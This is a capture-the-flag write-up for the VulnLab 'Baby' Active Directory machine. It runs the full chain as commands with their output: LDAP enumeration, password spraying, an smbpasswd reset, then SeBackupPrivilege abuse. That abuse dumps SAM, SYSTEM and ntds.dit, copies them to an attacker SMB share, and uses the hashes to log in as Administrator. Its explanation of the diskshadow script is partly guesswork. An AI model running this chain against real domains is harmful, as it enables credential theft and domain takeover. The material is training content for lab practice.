---
title: Baby - VulnLab
date: 2024-06-04 15:43:29
tags: [vulnlab, Easy]
categories: vulnlab
keywords: 'Vulnlab, Easy, Windows'
description: This machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).
cover: /images/vulnlab/baby-vl/baby_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---


This machine is a more beginner-level Active Directory machine, however it's very useful if you want to understand fundamentals of AD and how to exploit it. You'll see a lot of techniques here in more difficult machines (though they may be used differently).

# Enumeration

With that, let's run our base NMAP scan.

```Kali
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 17:18 EDT
Nmap scan report for 10.10.99.70
Host is up (0.11s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi

Nmap done: 1 IP address (1 host up) scanned in 17.63 seconds
```

You'll see that we have a few ports to look at initially, notably SMB and LDAP. There is no initial web service, so we'll check out the former ports. Let's run another NMAP scan against the LDAP service so we can grab the NetBIOS name and FQDN of the machine.


```Kali
└─$ sudo nmap 10.10.99.70 -A

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
|   DNS_Computer_Name: BabyDC.baby.vl
| ssl-cert: Subject: commonName=BabyDC.baby.vl
```

Let's add these to our `/etc/hosts` file so we can resolve any future enumeration techniques to the correct DNS name. Furthermore, attempting to authenticate to SMB seems to not return anything in particular.

```Kali
└─$ smbclient -L 10.10.99.70 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.99.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

SMB does not seem to be helpful as of right now, so let's try to focus on LDAP. Normally, it's an extremely insecure practice to allow null LDAP enumeration. That being said, there's no harm in trying to run a few queries with LDAP to test for any responses.

# LDAP Enumeration

Let's first test for null authentication and query LDAP for all domain objects in the domain.

```Kali
└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b "DC=baby,DC=vl"

# extended LDIF
#
# LDAPv3
# base <DC=baby,DC=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# baby.vl
dn: DC=baby,DC=vl

# Administrator, Users, baby.vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
[...snip...]
```

You can see from the result that all of the domain objects were returned, meaning that we are able to query LDAP for essentially any domain object we'd like. If we were on a Windows workstation that was within the domain, we could use tools like `ADSearch` or `PowerView` to query for any users, groups, essentially any domain object we'd like.

Let's adjust our LDAP search query so we can create a user list.

```Kali
└─$ ldapsearch -x -H ldap://BabyDC.baby.vl:389 -D '' -w '' -b "DC=baby,DC=vl" | grep '@baby.vl' | awk '{print $2}' | cut -d '@' -f 1 > ul.txt; cat ul.txt

Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
```

I was getting ready to run some tests using this wordlist, but if you do a quick check over the LDAP dump you'll see that we missed a few users. I wasn't certain if this was an LDAP issue or a `grep` issue, but nonetheless I copied the remaining users into the wordlist. (`Caroline.Robinson` and `Ian.Walker`)

You'll notice at the end of the same full LDAP dump output under `Teresa.Bell`, there seems to be a description comment that says `description: Set initial password to [...snip...`.

We can infer based on the message that this is the initial password for users when they are created. Now that we have a list of users and a potential password, we can use `crackmapexec` to test if any users have this password still set to their account. We'll use SMB as our service to test against since we really don't need to query anything for LDAP anymore (since we can already dump the entire domain with null credentials).

```Kali
└─$ for user in $(cat ul.txt); do crackmapexec smb BabyDC.baby.vl -u $user -p 'BabyStart123!'; done

[...snip...]
SMB         BabyDC.baby.vl  445    BABYDC           [-] baby.vl\Caroline.Robinson:[...snip...] STATUS_PASSWORD_MUST_CHANGE
[...snip...]
```

You'll notice that we'll get a hit on `Caroline.Robinson`, stating that their password needs to change. This more than likely is notifying us that the user has not done their initial authentication to the domain yet or that they have gone past the password reset policy deadline. This can be the case with new employees and/or interns.

# Password Reset with SMBPasswd

In that case let's try to reset their password with `smbpasswd`. The only pre-reqs to this is that we specify the username and the specific remote machine we want to change it for.

```Kali
smbpasswd -r BabyDC.baby.vl -U BABYDC/'Caroline.Robinson'

Old SMB password: ([...snip...])
New SMB password: password123@
Retype new SMB password: password123@
Password changed for user Caroline.Robinson
```

If we test the same `crackmapexec` command as above for `Caroline.Robinson`, we can see that their password was successfully updated. Normally I'd now dump the LDAP with bloodhound to get all of the domain objects into a GUI, but if we test `crackmapexec` against WinRM we can see that we already are able to login as this user.

```Kali
└─$ crackmapexec winrm BabyDC.baby.vl -u 'Caroline.Robinson' -p 'password123@'
SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman
WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\Caroline.Robinson:password123@ (Pwn3d!)
```

After logging in, you can find the user flag within the user's Desktop directory.

![image1](/images/vulnlab/baby-vl/b.png "B")

# Privilege Escalation w/ SeBackupPrivilege

Let's do a quick privilege to see if there's anything that we can exploit.

```Evil-WinRM
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
[...snip...]
```

You'll see from the output that we have `SeBackupPrivilege` enabled for our user. This essentially means that we can backup various parts of the filesystem. In most cases, this can be for a engineer or technical support user and seems harmless at first glance. However, this means we can also backup sensitive files such as the `SAM` and `SYSTEM` databases. These database essentially house user accounts and security objects for all domain objects on the machine. The only issue is that this also houses user passwords, meaning if we dump these databases we can view the password for every user on the machine.

So first, let's dump both of these databases into a temporary directory.

```Evil-WinRM
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> mkdir C:\temp
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam c:\temp\sam
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system c:\temp\system
```

These files will now be saved to our temporary directory, in which we can download them to our local machine. This machine does have AV enabled so we won't be able to set up a simple C2 server's without obfuscating our payloads, meaning we'll need to find a way to transfer our files back and forth in a inconspicuous manner.

We can use Impacket's `smbserver` to spin up a quick SMB server, to which we can then transfer our files to our Kali machine.

```Evil-WinRM -> Kali
└─$ mkdir share/

└─$ impacket-smbserver smb share/ -smb2support

*Evil-WinRM* PS C:\temp> copy sam \\(Kali IP)\smb\sam
*Evil-WinRM* PS C:\temp> copy system \\(Kali IP)\smb\system
```

You'll notice a lot of output from our SMB server when we're copying the files over, this is just a built-in Impacket functionality that will dump the user's NetNTLM hash when they authenticate to our SMB server. We can ignore this, and if we look at the `share/` directory we'll see the two files that we downloaded are in this folder.

Now that we have both of these files, let's run `samdump` on them to retrieve credentials that are within these two databases.

```Kali
└─$ samdump2 system sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Now that we have the Administrator's hash, let's test the creds once more with `crackmapexec` and by passing the hash to it.

```Kali
└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'
SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman
WINRM       BabyDC.baby.vl  5985   BABYDC           [-] baby.vl\Administrator:[...snip...]
```

The thing is, this will fail. The Administrator hash above is not an Administrator hash that we can login with. There is a hash of an account with the same username on the DC, meaning we'll need to look a little further with our `SeBackupPrivilege` to dump another file.

# Diskshadow/Robocopy for NTDS.dit

The file in particular that we're looking for is a copy of the `C:\`'s ntds database, which stores Active Directory information of the respective filesystem path. We can use this along with our previously obtained `SAM` and `SYSTEM` databases to dump the AD secrets of the domain controller.

To exploit this, we can use `diskshadow` and `robocopy` to create a copy of the current drive and copy the copied filesystem back to the `C:\` drive. (Credit goes to Nairuz Abulhul for their explanation of this exploit in their article [here](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960).)

Let's first create a file named `script.txt` and transfer it to our `Evil-WinRM` session. The contents of the script can be seen below.

```diskshadow
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

1. `set metadata C:\Windows\Temp\meta.cabX`: This command is setting metadata for the backup operation. It seems to be specifying the location where metadata related to the backup will be stored, in this case, `C:\Windows\Temp\meta.cabX`.
    
2. `set context clientaccessibleX`: This command is setting the context for the backup operation. It seems to be specifying that the backup should be accessible by the client. The `X` might be a placeholder or a variable.
    
3. `set context persistentX`: This command is setting another context for the backup operation. It could be specifying that the backup should be persistent, meaning it should remain available or stored for a certain period. The `X` might be a placeholder or a variable.
    
4. `begin backupX`: This command is initiating the backup operation. The `X` might be a placeholder or a variable.
    
5. `add volume C: alias cdriveX`: This command is adding the volume `C:` to the backup operation with an alias `cdriveX`. This means that the contents of the `C:` drive will be included in the backup. The `X` might be a placeholder or a variable.
    
6. `createX`: This command is creating something related to the backup operation. It's not entirely clear what it's creating without more context or additional information about the script.
    
7. `expose %cdrive% E:X`: This command seems to be exposing the contents of the `C:` drive, which was added to the backup operation with the alias `cdriveX`, to a location specified by `%cdrive%` on drive `E:`. This might involve mounting the backup or making it accessible in some way. The `X` might be a placeholder or a variable.
    
8. `end backupX`: This command is ending the backup operation. The `X` might be a placeholder or a variable.

Let's set up a simple Python server so we can curl this script to our WinRM session.

```Kali
└─$ python3 -m http.server 9001

*Evil-WinRM* PS C:\temp> curl http://(Kali IP):9001/script.txt -O script.txt
```

Next, let's run `diskshadow` to create a copy of the `C:\` drive.

```Evil-WinRM
diskshadow /s script.txt
```

After the filesystem copy finishes, it will be saved to `E:\Windows`. This is where we can use `robocopy` to move it back to our `C:\` drive.

`robocopy /b E:\Windows\ntds . ntds.dit`

Let's now use our SMB server on our Kali machine to download the `ntds.dit` file from the WinRM session.

```Evil-WinRM
*Evil-WinRM* PS C:\temp> copy ntds.dit \\10.8.0.173\smb\ntds.dit
```

From here, all that's left to do is retrieve the correct NTLM hashes by dumping the DC secrets with `impacket-secretsdump`.

```Kali
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::
```

This will dump the NTLM hashes for every user that has the ability to login to a service on the domain controller. At the bottom of the output, you'll find hashes for all of the AD users that we dumped through LDAP at the beginning of this machine.

Underneath `[*] Reading and decrypting hashes from ntds.dit`, we'll find the correct NTLM hash for the Administrator user. We can verify our ability to connect with this using `crackmapexec` once more.

```Kali
└─$ crackmapexec winrm BabyDC.baby.vl -u 'Administrator' -H '[...snip...]'
SMB         BabyDC.baby.vl  5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
HTTP        BabyDC.baby.vl  5985   BABYDC           [*] http://BabyDC.baby.vl:5985/wsman
WINRM       BabyDC.baby.vl  5985   BABYDC           [+] baby.vl\Administrator:[...snip...] (Pwn3d!)
```

Thus, we have the ability to log in through WinRM as the Administrator. The root hash can be found within the Administrator's Desktop directory.

![image2](/images/vulnlab/baby-vl/c.png "C")

# Conclusion

This means we have rooted this machine! Credit goes to xct for the development of this machine. As said previously, this machine is really helpful if you want to learn Active Directory basics.

# Resources

https://lonewolf.my.site.com/s/article/DPN-Reset-Samba-Passwords#:~:text=At%20the%20%23%20prompt%20type%20in,is%20to%20reset%20the%20password.&text=To%20set%20up%20a%20new,will%20ask%20for%20the%20password
https://github.com/BishopFox/sliver
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960


